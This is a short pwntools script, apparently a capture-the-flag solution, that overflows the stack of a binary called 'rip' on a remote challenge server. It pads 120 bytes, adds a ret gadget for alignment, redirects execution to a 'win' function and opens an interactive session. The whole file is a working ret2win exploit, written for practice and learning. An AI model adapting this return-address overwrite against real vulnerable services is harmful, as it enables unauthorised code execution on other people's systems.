from pwn import *

context.arch = 'amd64'
# context.log_level = 'debug'

# Local / remote flags
LOCAL = False
GDB = False
PROCESS = 'rip'
REMOTE_HOST = "io.ept.gg"
REMOTE_PORT = 30009

# Start the process or open a remote connection
if (LOCAL):
    io = process(PROCESS)
else:
    io = connect(REMOTE_HOST, REMOTE_PORT)

# gdb debugging and script
if (LOCAL and GDB):
    gdbscript = '''
    '''
    pid = gdb.attach(io, gdbscript=gdbscript)

# load the ELF-object to easily lookup symbols
elf = ELF(PROCESS)
addr_win = elf.symbols['win']
# print(f"{addr_win:X}")

# load ROP-gadgets
rop = ROP(PROCESS)

offset = 120

payload = b"".join([
    b'A' * offset,
    # extra ret-instruction for `MOVAPS` issue on Ubuntu
    p64(rop.ret.address),
    p64(addr_win)
])

# Used for testing the payload in `gdb`:
file = open("payload", "wb")
file.write(payload + b"\n")
file.close()

io.recvuntil(b"> ")
io.sendline(payload)
io.interactive()
